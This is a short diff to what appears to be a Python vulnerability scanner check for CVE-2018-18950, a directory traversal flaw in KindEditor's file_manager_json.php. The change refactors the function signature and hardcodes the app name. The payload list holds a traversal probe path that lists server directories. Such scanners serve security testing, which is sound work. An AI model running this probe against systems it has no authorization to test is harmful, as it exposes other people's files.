@@ -5,14 +5,14 @@ cve_2018_18950_payloads = [
     {'path': 'php/file_manager_json.php?path=/'},
 ]
 
-def cve_2018_18950_scan(self, clients):
+def cve_2018_18950_scan(clients):
     ''' KindEditor 3.4.2/3.5.5版本中的php/file_manager_json.php文件存在目录遍历漏洞, 
         远程攻击者可借助"path"参数利用该漏洞浏览文件
     '''
     client = clients.get('reqClient')
     
     vul_info = {
-        'app_name': self.app_name,
+        'app_name': 'Kindeditor',
         'vul_type': 'File-Read',
         'vul_id': 'CVE-2018-18950',
     }
